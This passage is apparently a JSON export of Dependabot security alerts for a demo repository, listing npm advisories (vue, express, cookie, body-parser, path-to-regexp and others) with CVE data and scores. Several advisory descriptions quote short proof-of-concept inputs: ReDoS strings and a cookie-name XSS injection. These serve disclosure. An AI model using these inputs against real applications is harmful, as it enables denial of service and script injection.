            "url": "https://security.netapp.com/advisory/ntap-20241220-0004"
          },
          {
            "url": "https://github.com/advisories/GHSA-fc9h-whq2-v747"
          }
        ],
        "published_at": "2024-10-15T15:30:56Z",
        "updated_at": "2024-12-20T15:30:48Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "elliptic"
            },
            "severity": "low",
            "vulnerable_version_range": "< 6.6.0",
            "first_patched_version": {
              "identifier": "6.6.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "score": 4.8
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N",
            "score": 2.3
          }
        },
        "epss": {
          "percentage": 0.00041,
          "percentile": 0.11889
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
          "score": 4.8
        },
        "cwes": [
          {
            "cwe_id": "CWE-347",
            "name": "Improper Verification of Cryptographic Signature"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "severity": "low",
        "vulnerable_version_range": "< 6.6.0",
        "first_patched_version": {
          "identifier": "6.6.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/159",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/159",
      "created_at": "2025-06-02T13:38:21Z",
      "updated_at": "2025-06-02T13:38:21Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 158,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "vue"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "runtime",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-5j4c-8p2g-v4jx",
        "cve_id": "CVE-2024-9506",
        "summary": "ReDoS vulnerability in vue package that is exploitable through inefficient regex evaluation in the parseHTML function",
        "description": "The ReDoS can be exploited through the `parseHTML` function in the `html-parser.ts` file. This flaw allows attackers to slow down the application by providing specially crafted input that causes inefficient processing of regular expressions, leading to excessive resource consumption.\n\nTo demonstrate this vulnerability, here's an example. In a Vue client-side application, create a new Vue instance with a template string that includes a `<script>` tag but closes it incorrectly with something like `</textarea>`.\n\n```javascript\nnew Vue({\n  el: '#app',\n  template: '\n    <div>\n      Hello, world!\n      <script>${'<'.repeat(1000000)}</textarea>\n    </div>'\n});\n```\nNext, set up a basic HTML page (e.g., index.html) to load this JavaScript and mount the Vue instance:\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <title>My first Vue app</title>\n</head>\n<body>\n  <div id=\\\"app\\\">Loading...</div>\n</body>\n</html>\n```\n\nWhen you visit the app in your browser at http://localhost:3000, you'll notice that the time taken to parse and mount the Vue application increases significantly due to the ReDoS vulnerability, demonstrating how the flaw can affect performance.",
        "severity": "low",
        "identifiers": [
          {
            "value": "GHSA-5j4c-8p2g-v4jx",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-9506",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-9506"
          },
          {
            "url": "https://www.herodevs.com/vulnerability-directory/cve-2024-9506"
          },
          {
            "url": "https://github.com/advisories/GHSA-5j4c-8p2g-v4jx"
          }
        ],
        "published_at": "2024-10-15T18:30:50Z",
        "updated_at": "2024-10-24T20:05:37Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "vue"
            },
            "severity": "low",
            "vulnerable_version_range": ">= 2.0.0-alpha.1, < 3.0.0-alpha.0",
            "first_patched_version": {
              "identifier": "3.0.0-alpha.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "score": 3.7
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
            "score": 2.9
          }
        },
        "epss": {
          "percentage": 0.00042,
          "percentile": 0.12261
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "score": 3.7
        },
        "cwes": [
          {
            "cwe_id": "CWE-1333",
            "name": "Inefficient Regular Expression Complexity"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "vue"
        },
        "severity": "low",
        "vulnerable_version_range": ">= 2.0.0-alpha.1, < 3.0.0-alpha.0",
        "first_patched_version": {
          "identifier": "3.0.0-alpha.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/158",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/158",
      "created_at": "2025-06-02T13:38:21Z",
      "updated_at": "2025-06-02T13:38:21Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 157,
      "state": "auto_dismissed",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "http-proxy-middleware"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-c7qv-q95q-8v27",
        "cve_id": "CVE-2024-21536",
        "summary": "Denial of service in http-proxy-middleware",
        "description": "Versions of the package http-proxy-middleware before 2.0.7, from 3.0.0 and before 3.0.3 are vulnerable to Denial of Service (DoS) due to an UnhandledPromiseRejection error thrown by micromatch. An attacker could kill the Node.js process and crash the server by making requests to certain paths.",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-c7qv-q95q-8v27",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-21536",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21536"
          },
          {
            "url": "https://github.com/chimurai/http-proxy-middleware/commit/0b4274e8cc9e9a2c5a06f35fbf456ccfcebc55a5"
          },
          {
            "url": "https://github.com/chimurai/http-proxy-middleware/commit/788b21e4aff38332d6319557d4a5b1b13b1f9a22"
          },
          {
            "url": "https://gist.github.com/mhassan1/28be67266d82a53708ed59ce5dc3c94a"
          },
          {
            "url": "https://security.snyk.io/vuln/SNYK-JS-HTTPPROXYMIDDLEWARE-8229906"
          },
          {
            "url": "https://github.com/advisories/GHSA-c7qv-q95q-8v27"
          }
        ],
        "published_at": "2024-10-19T06:30:30Z",
        "updated_at": "2024-10-22T19:47:42Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "http-proxy-middleware"
            },
            "severity": "high",
            "vulnerable_version_range": "< 2.0.7",
            "first_patched_version": {
              "identifier": "2.0.7"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "http-proxy-middleware"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 3.0.0, < 3.0.3",
            "first_patched_version": {
              "identifier": "3.0.3"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00186,
          "percentile": 0.41112
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-400",
            "name": "Uncontrolled Resource Consumption"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "http-proxy-middleware"
        },
        "severity": "high",
        "vulnerable_version_range": "< 2.0.7",
        "first_patched_version": {
          "identifier": "2.0.7"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/157",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/157",
      "created_at": "2025-06-02T13:38:21Z",
      "updated_at": "2025-06-02T13:38:21Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": "2025-06-02T13:38:21Z"
    },
    {
      "number": 156,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-434g-2637-qmqr",
        "cve_id": "CVE-2024-48949",
        "summary": "Elliptic's verify function omits uniqueness validation",
        "description": "The Elliptic package 6.5.5 for Node.js for EDDSA implementation does not perform the required check if the signature proof(s) is within the bounds of the order n of the base point of the elliptic curve, leading to signature malleability. Namely, the `verify` function in `lib/elliptic/eddsa/index.js` omits `sig.S().gte(sig.eddsa.curve.n) || sig.S().isNeg()` validation.\n\nThis vulnerability could have a security-relevant impact if an application relies on the uniqueness of a signature.",
        "severity": "low",
        "identifiers": [
          {
            "value": "GHSA-434g-2637-qmqr",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-48949",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-48949"
          },
          {
            "url": "https://github.com/indutny/elliptic/commit/7ac5360118f74eb02da73bdf9f24fd0c72ff5281"
          },
          {
            "url": "https://github.com/indutny/elliptic/compare/v6.5.5...v6.5.6"
          },
          {
            "url": "https://security.netapp.com/advisory/ntap-20241227-0003"
          },
          {
            "url": "https://github.com/advisories/GHSA-434g-2637-qmqr"
          }
        ],
        "published_at": "2024-10-10T03:30:44Z",
        "updated_at": "2024-12-27T18:31:27Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "elliptic"
            },
            "severity": "low",
            "vulnerable_version_range": "< 6.5.6",
            "first_patched_version": {
              "identifier": "6.5.6"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "score": 5.3
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:U",
            "score": 2.7
          }
        },
        "epss": {
          "percentage": 0.00068,
          "percentile": 0.21466
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "score": 5.3
        },
        "cwes": [
          {
            "cwe_id": "CWE-347",
            "name": "Improper Verification of Cryptographic Signature"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "severity": "low",
        "vulnerable_version_range": "< 6.5.6",
        "first_patched_version": {
          "identifier": "6.5.6"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/156",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/156",
      "created_at": "2025-06-02T13:38:21Z",
      "updated_at": "2025-06-02T13:38:21Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 155,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "cookie"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-pxg6-pf52-xh8x",
        "cve_id": "CVE-2024-47764",
        "summary": "cookie accepts cookie name, path, and domain with out of bounds characters",
        "description": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
        "severity": "low",
        "identifiers": [
          {
            "value": "GHSA-pxg6-pf52-xh8x",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-47764",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x"
          },
          {
            "url": "https://github.com/jshttp/cookie/pull/167"
          },
          {
            "url": "https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c"
          },
          {
            "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
          }
        ],
        "published_at": "2024-10-04T20:31:00Z",
        "updated_at": "2025-04-15T13:56:44Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "cookie"
            },
            "severity": "low",
            "vulnerable_version_range": "< 0.7.0",
            "first_patched_version": {
              "identifier": "0.7.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": null,
            "score": 0.0
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00043,
          "percentile": 0.1265
        },
        "cvss": {
          "vector_string": null,
          "score": 0.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-74",
            "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "cookie"
        },
        "severity": "low",
        "vulnerable_version_range": "< 0.7.0",
        "first_patched_version": {
          "identifier": "0.7.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/155",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/155",
      "created_at": "2025-06-02T13:38:21Z",
      "updated_at": "2025-06-02T13:38:21Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 154,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "send"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-m6fv-jmcg-4jfg",
        "cve_id": "CVE-2024-43799",
        "summary": "send vulnerable to template injection that can lead to XSS",
        "description": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in send 0.19.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
        "severity": "low",
        "identifiers": [
          {
            "value": "GHSA-m6fv-jmcg-4jfg",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-43799",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/pillarjs/send/security/advisories/GHSA-m6fv-jmcg-4jfg"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43799"
          },
          {
            "url": "https://github.com/pillarjs/send/commit/ae4f2989491b392ae2ef3b0015a019770ae65d35"
          },
          {
            "url": "https://github.com/advisories/GHSA-m6fv-jmcg-4jfg"
          }
        ],
        "published_at": "2024-09-10T19:42:41Z",
        "updated_at": "2024-11-18T16:27:12Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "send"
            },
            "severity": "low",
            "vulnerable_version_range": "< 0.19.0",
            "first_patched_version": {
              "identifier": "0.19.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
            "score": 5.0
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:L",
            "score": 2.3
          }
        },
        "epss": {
          "percentage": 0.00046,
          "percentile": 0.14064
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
          "score": 5.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-79",
            "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "send"
        },
        "severity": "low",
        "vulnerable_version_range": "< 0.19.0",
        "first_patched_version": {
          "identifier": "0.19.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/154",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/154",
      "created_at": "2025-06-02T13:38:21Z",
      "updated_at": "2025-06-02T13:38:21Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 153,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "serve-static"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-cm22-4g7w-348p",
        "cve_id": "CVE-2024-43800",
        "summary": "serve-static vulnerable to template injection that can lead to XSS",
        "description": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in serve-static 1.16.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
        "severity": "low",
        "identifiers": [
          {
            "value": "GHSA-cm22-4g7w-348p",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-43800",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/expressjs/serve-static/security/advisories/GHSA-cm22-4g7w-348p"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43800"
          },
          {
            "url": "https://github.com/expressjs/serve-static/commit/0c11fad159898cdc69fd9ab63269b72468ecaf6b"
          },
          {
            "url": "https://github.com/expressjs/serve-static/commit/ce730896fddce1588111d9ef6fdf20896de5c6fa"
          },
          {
            "url": "https://github.com/advisories/GHSA-cm22-4g7w-348p"
          }
        ],
        "published_at": "2024-09-10T19:42:33Z",
        "updated_at": "2024-11-18T16:27:12Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "serve-static"
            },
            "severity": "low",
            "vulnerable_version_range": "< 1.16.0",
            "first_patched_version": {
              "identifier": "1.16.0"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "serve-static"
            },
            "severity": "low",
            "vulnerable_version_range": ">= 2.0.0, < 2.1.0",
            "first_patched_version": {
              "identifier": "2.1.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
            "score": 5.0
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:L",
            "score": 2.3
          }
        },
        "epss": {
          "percentage": 0.00044,
          "percentile": 0.13096
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
          "score": 5.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-79",
            "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "serve-static"
        },
        "severity": "low",
        "vulnerable_version_range": "< 1.16.0",
        "first_patched_version": {
          "identifier": "1.16.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/153",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/153",
      "created_at": "2025-06-02T13:38:21Z",
      "updated_at": "2025-06-02T13:38:21Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 152,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "express"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-qw6h-vgh9-j6wx",
        "cve_id": "CVE-2024-43796",
        "summary": "express vulnerable to XSS via response.redirect()",
        "description": "### Impact\n\nIn express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in express 4.20.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
        "severity": "low",
        "identifiers": [
          {
            "value": "GHSA-qw6h-vgh9-j6wx",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-43796",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/expressjs/express/security/advisories/GHSA-qw6h-vgh9-j6wx"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43796"
          },
          {
            "url": "https://github.com/expressjs/express/commit/54271f69b511fea198471e6ff3400ab805d6b553"
          },
          {
            "url": "https://github.com/advisories/GHSA-qw6h-vgh9-j6wx"
          }
        ],
        "published_at": "2024-09-10T19:41:04Z",
        "updated_at": "2024-11-18T16:27:12Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "express"
            },
            "severity": "low",
            "vulnerable_version_range": "< 4.20.0",
            "first_patched_version": {
              "identifier": "4.20.0"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "express"
            },
            "severity": "low",
            "vulnerable_version_range": ">= 5.0.0-alpha.1, < 5.0.0",
            "first_patched_version": {
              "identifier": "5.0.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
            "score": 5.0
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:L",
            "score": 2.3
          }
        },
        "epss": {
          "percentage": 0.00045,
          "percentile": 0.13642
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
          "score": 5.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-79",
            "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "express"
        },
        "severity": "low",
        "vulnerable_version_range": "< 4.20.0",
        "first_patched_version": {
          "identifier": "4.20.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/152",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/152",
      "created_at": "2025-06-02T13:38:21Z",
      "updated_at": "2025-06-02T13:38:21Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 151,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "body-parser"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-qwcr-r2fm-qrc7",
        "cve_id": "CVE-2024-45590",
        "summary": "body-parser vulnerable to denial of service when url encoding is enabled",
        "description": "### Impact\n\nbody-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service.\n\n### Patches\n\nthis issue is patched in 1.20.3\n\n### References\n",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-qwcr-r2fm-qrc7",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-45590",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/expressjs/body-parser/security/advisories/GHSA-qwcr-r2fm-qrc7"
          },
          {
            "url": "https://github.com/expressjs/body-parser/commit/b2695c4450f06ba3b0ccf48d872a229bb41c9bce"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45590"
          },
          {
            "url": "https://github.com/advisories/GHSA-qwcr-r2fm-qrc7"
          }
        ],
        "published_at": "2024-09-10T15:52:39Z",
        "updated_at": "2024-09-10T19:01:11Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "body-parser"
            },
            "severity": "high",
            "vulnerable_version_range": "< 1.20.3",
            "first_patched_version": {
              "identifier": "1.20.3"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
            "score": 8.7
          }
        },
        "epss": {
          "percentage": 0.00532,
          "percentile": 0.66224
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-405",
            "name": "Asymmetric Resource Consumption (Amplification)"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "body-parser"
        },
        "severity": "high",
        "vulnerable_version_range": "< 1.20.3",
        "first_patched_version": {
          "identifier": "1.20.3"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/151",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/151",
      "created_at": "2025-06-02T13:38:20Z",
      "updated_at": "2025-06-02T13:38:20Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 150,
      "state": "auto_dismissed",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "path-to-regexp"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-9wv6-86v2-598j",
        "cve_id": "CVE-2024-45296",
        "summary": "path-to-regexp outputs backtracking regular expressions",
        "description": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. 